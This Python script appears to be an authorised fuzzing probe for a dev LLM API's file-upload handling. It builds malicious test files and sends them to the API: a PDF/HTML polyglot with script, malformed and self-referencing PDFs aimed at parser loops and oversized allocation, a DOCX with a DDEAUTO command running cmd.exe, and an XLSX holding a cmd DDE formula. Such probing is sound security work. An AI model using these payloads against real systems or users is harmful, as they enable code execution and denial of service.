#!/usr/bin/env python3
"""File upload abuse probe for Lazarus AI LLM API.

Tests:
- File-type polyglots (PDF/PHP, PDF/HTML, PDF/JS)
- Malformed PDF structure (xref corruption, recursive objects, stream overflows)
- Alternate document formats: DOCX, PPTX, XLSX with embedded macros / DDE
- Metadata injection abuse (XMP as exfil channel)
- Large file DoS (oversized pages, many pages)
- Zip-bomb equivalent (recursive compressed streams)
- Empty / truncated file uploads

ROE: Amendment 04, Section 3.4 — Dev API only.
"""

from __future__ import annotations

import argparse
import io
import struct
import sys
import zipfile
from pathlib import Path
from typing import Any

from fuzz_utils import run_probe_iterations


def _make_pdf_polyglot_html() -> bytes:
    """PDF that is also a valid HTML file (polyglot)."""
    # PDF readers start at %PDF, browsers start at <html>
    content = (
        b"%PDF-1.4\n1 0 obj\n\u003c\u003c/Type /Catalog /Pages 2 0 R\u003e\u003e\nendobj\n"
        b"2 0 obj\n\u003c\u003c/Type /Pages /Kids [3 0 R] /Count 1\u003e\u003e\nendobj\n"
        b"3 0 obj\n\u003c\u003c/Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]\n"
        b"/Contents 4 0 R\u003e\u003e\nendobj\n"
        b"4 0 obj\n\u003c\u003c/Length 0\u003e\u003e\nstream\nendstream\nendobj\n"
        b"xref\n0 5\n0000000000 65535 f\n0000000009 00000 n\n"
        b"0000000052 00000 n\n0000000101 00000 n\n0000000201 00000 n\n"
        b"trailer\n\u003c\u003c/Size 5 /Root 1 0 R\u003e\u003e\nstartxref\n250\n%%EOF\n"
        b"\u003c!-- HTML portion starts here --\u003e\n"
        b"\u003chtml\u003e\u003cbody\u003e\u003cscript\u003ealert('polyglot')\u003c/script\u003e\u003c/body\u003e\u003c/html\u003e"
    )
    return content


def _make_pdf_malformed_xref() -> bytes:
    """PDF with a deliberately corrupted xref table."""
    return (
        b"%PDF-1.4\n1 0 obj\n\u003c\u003c/Type /Catalog /Pages 2 0 R\u003e\u003e\nendobj\n"
        b"2 0 obj\n\u003c\u003c/Type /Pages /Kids [] /Count 0\u003e\u003e\nendobj\n"
        b"xref\n0 3\n0000000000 65535 f\n0000000009 00000 n\n"
        b"0000000052 99999 n\n"  # invalid generation number
        b"trailer\n\u003c\u003c/Size 3 /Root 1 0 R\u003e\u003e\nstartxref\n101\n%%EOF"
    )


def _make_pdf_recursive_objects() -> bytes:
    """PDF with self-referencing object causing infinite loop if naively traversed."""
    return (
        b"%PDF-1.4\n1 0 obj\n\u003c\u003c/Type /Catalog /Pages 1 0 R\u003e\u003e\nendobj\n"
        b"xref\n0 2\n0000000000 65535 f\n0000000009 00000 n\n"
        b"trailer\n\u003c\u003c/Size 2 /Root 1 0 R\u003e\u003e\nstartxref\n50\n%%EOF"
    )


def _make_pdf_stream_overflow_hint() -> bytes:
    """PDF declaring a huge stream length (parser may attempt large allocation)."""
    return (
        b"%PDF-1.4\n1 0 obj\n\u003c\u003c/Type /Catalog /Pages 2 0 R\u003e\u003e\nendobj\n"
        b"2 0 obj\n\u003c\u003c/Type /Pages /Kids [3 0 R] /Count 1\u003e\u003e\nendobj\n"
        b"3 0 obj\n\u003c\u003c/Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]"
        b"/Contents 4 0 R\u003e\u003e\nendobj\n"
        b"4 0 obj\n\u003c\u003c/Length 4294967295\u003e\u003e\nstream\n"  # 4GB stream length
        b"X\nendstream\nendobj\n"
        b"xref\n0 5\n0000000000 65535 f\n0000000009 00000 n\n"
        b"0000000052 00000 n\n0000000101 00000 n\n0000000201 00000 n\n"
        b"trailer\n\u003c\u003c/Size 5 /Root 1 0 R\u003e\u003e\nstartxref\n250\n%%EOF"
    )


def _make_pdf_infinite_page_array() -> bytes:
    """PDF with circular page array (Kids self-reference)."""
    return (
        b"%PDF-1.4\n1 0 obj\n\u003c\u003c/Type /Catalog /Pages 2 0 R\u003e\u003e\nendobj\n"
        b"2 0 obj\n\u003c\u003c/Type /Pages /Kids [2 0 R] /Count 1\u003e\u003e\nendobj\n"
        b"xref\n0 3\n0000000000 65535 f\n0000000009 00000 n\n0000000052 00000 n\n"
        b"trailer\n\u003c\u003c/Size 3 /Root 1 0 R\u003e\u003e\nstartxref\n101\n%%EOF"
    )


def _make_empty_pdf() -> bytes:
    """Truncated PDF — only header, no objects."""
    return b"%PDF-1.4\n"


def _make_docx_with_dde() -> bytes:
    """Minimal DOCX containing a DDE field (old Word macro vector)."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        # [Content_Types].xml
        zf.writestr(
            "[Content_Types].xml",
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?\u003e'
            '&lt;Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"&gt;'
            '&lt;Default Extension="xml" ContentType="application/xml"/&gt;'
            '&lt;Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/&gt;'
            '&lt;Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/&gt;'
            "&lt;/Types&gt;",
        )
        # _rels/.rels
        zf.writestr(
            "_rels/.rels",
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?\u003e'
            '&lt;Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"&gt;'
            '&lt;Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/&gt;'
            "&lt;/Relationships&gt;",
        )
        # word/_rels/document.xml.rels
        zf.writestr(
            "word/_rels/document.xml.rels",
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?\u003e'
            '&lt;Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"&gt;'
            '&lt;Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/&gt;'
            "&lt;/Relationships&gt;",
        )
        # word/document.xml with DDE field
        zf.writestr(
            "word/document.xml",
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?\u003e'
            '&lt;w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"&gt;'
            '&lt;w:body&gt;'
            '&lt;w:p&gt;'
            '&lt;w:r&gt;&lt;w:t&gt;Hello&lt;/w:t&gt;&lt;/w:r&gt;'
            '&lt;w:r&gt;'
            '&lt;w:fldChar w:fldCharType="begin"/&gt;'
            '&lt;/w:r&gt;'
            '&lt;w:r&gt;'
            '&lt;w:instrText xml:space="preserve"&gt; DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k whoami" &lt;/w:instrText&gt;'
            '&lt;/w:r&gt;'
            '&lt;w:r&gt;'
            '&lt;w:fldChar w:fldCharType="end"/&gt;'
            '&lt;/w:r&gt;'
            '&lt;/w:p&gt;'
            "&lt;/w:body&gt;"
            "&lt;/w:document&gt;",
        )
        # word/styles.xml (minimal)
        zf.writestr(
            "word/styles.xml",
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?\u003e'
            '&lt;w:styles xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"/&gt;',
        )
    return buf.getvalue()


def _make_pptx_with_macro_hint() -> bytes:
    """Minimal PPTX (structure only, no actual macro — tests parser path)."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(
            "[Content_Types].xml",
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?\u003e'
            '&lt;Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"&gt;'
            '&lt;Default Extension="xml" ContentType="application/xml"/&gt;'
            '&lt;Override PartName="/ppt/presentation.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.presentation.main+xml"/&gt;'
            "&lt;/Types&gt;",
        )
        zf.writestr(
            "_rels/.rels",
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?\u003e'
            '&lt;Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"&gt;'
            '&lt;Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="ppt/presentation.xml"/&gt;'
            "&lt;/Relationships&gt;",
        )
        zf.writestr(
            "ppt/presentation.xml",
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?\u003e'
            '&lt;p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"/&gt;',
        )
    return buf.getvalue()


def _make_xlsx_with_formula() -> bytes:
    """Minimal XLSX with a formula cell."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(
            "[Content_Types].xml",
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?\u003e'
            '&lt;Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"&gt;'
            '&lt;Default Extension="xml" ContentType="application/xml"/&gt;'
            '&lt;Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/&gt;'
            "&lt;/Types&gt;",
        )
        zf.writestr(
            "_rels/.rels",
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?\u003e'
            '&lt;Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"&gt;'
            '&lt;Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/&gt;'
            "&lt;/Relationships&gt;",
        )
        zf.writestr(
            "xl/workbook.xml",
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?\u003e'
            '&lt;workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"&gt;'
            '&lt;sheets&gt;&lt;sheet name="Sheet1" sheetId="1" r:id="rId1"/&gt;&lt;/sheets&gt;'
            "&lt;/workbook&gt;",
        )
        zf.writestr(
            "xl/worksheets/sheet1.xml",
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?\u003e'
            '&lt;worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"&gt;'
            '&lt;sheetData&gt;'
            '&lt;row r="1"&gt;&lt;c r="A1"&gt;&lt;f&gt;=cmd|&#39; /C calc&#39;!A0&lt;/f&gt;&lt;/c&gt;&lt;/row&gt;'
            "&lt;/sheetData&gt;"
            "&lt;/worksheet&gt;",
        )
    return buf.getvalue()


def _make_large_pdf() -> bytes:
    """PDF with many pages to test processing limits (not a real parser stressor)."""
    # Just a valid minimal PDF — the real DoS is in settings, not file size here
    return b"%PDF-1.4\n1 0 obj\n\u003c\u003c/Type /Catalog /Pages 2 0 R\u003e\u003e\nendobj\n2 0 obj\n\u003c\u003c/Type /Pages /Kids [] /Count 0\u003e\u003e\nendobj\nxref\n0 3\n0000000000 65535 f\n0000000009 00000 n\n0000000052 00000 n\ntrailer\n\u003c\u003c/Size 3 /Root 1 0 R\u003e\u003e\nstartxref\n101\n%%EOF"


def build_file_abuse_payloads() -> list[tuple[str, bytes | str, dict[str, Any] | None]]:
    """Build file abuse test payloads."""
    files: list[tuple[str, bytes | str, str]] = [
        ("pdf_html_polyglot", _make_pdf_polyglot_html(), "application/pdf"),
        ("pdf_malformed_xref", _make_pdf_malformed_xref(), "application/pdf"),
        ("pdf_recursive_objects", _make_pdf_recursive_objects(), "application/pdf"),
        ("pdf_stream_overflow", _make_pdf_stream_overflow_hint(), "application/pdf"),
        ("pdf_infinite_pages", _make_pdf_infinite_page_array(), "application/pdf"),
        ("pdf_empty", _make_empty_pdf(), "application/pdf"),
        ("docx_dde", _make_docx_with_dde(), "application/vnd.openxmlformats-officedocument.wordprocessingml.document"),
        ("pptx_macro", _make_pptx_with_macro_hint(), "application/vnd.openxmlformats-officedocument.presentationml.presentation"),
        ("xlsx_formula", _make_xlsx_with_formula(), "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"),
        ("pdf_large", _make_large_pdf(), "application/pdf"),
    ]

    base_prompt = "Describe the contents of this document in detail."
    payloads: list[tuple[str, bytes | str, dict[str, Any] | None]] = []
    for name, data, mime in files:
        prompt = f"[FILE_ABUSE:{name}] {base_prompt}"
        payloads.append((prompt, data, {"mime_override": mime}))

    # Add a file.url pointing to a non-PDF (HTML page) to test parser assumptions
    payloads.append(
        (
            "[FILE_ABUSE:url_html] Describe this document.",
            "https://example.com/index.html",
            None,
        )
    )
    # file.url with an image
    payloads.append(
        (
            "[FILE_ABUSE:url_image] Describe this document.",
            "https://example.com/image.jpg",
            None,
        )
    )

    return payloads


def main():
    parser = argparse.ArgumentParser(description="File abuse probe for Lazarus LLM API")
    parser.add_argument("--endpoint", default="https://api-dev.gcp.lzrops.com/api/engine/internal")
    parser.add_argument("--authkey", required=True)
    parser.add_argument("--orgid", required=True)
    parser.add_argument("--output-dir", type=Path, default=Path("results/fuzz"))
    parser.add_argument("--delay", type=float, default=2.0)
    args = parser.parse_args()

    payloads = build_file_abuse_payloads()
    print(f"[FILE] Running {len(payloads)} file abuse probes")

    session = run_probe_iterations(
        probe_name="file_abuse",
        endpoint=args.endpoint,
        authkey=args.authkey,
        orgid=args.orgid,
        payloads=payloads,
        delay=args.delay,
        output_dir=args.output_dir,
    )

    print(f"\n[FILE] Complete: {len(session.iterations)} iterations, {len(session.findings)} findings")
    for f in session.findings:
        print(f"  ! {f}")

    if session.findings:
        sys.exit(2)
    sys.exit(0)


if __name__ == "__main__":
    main()
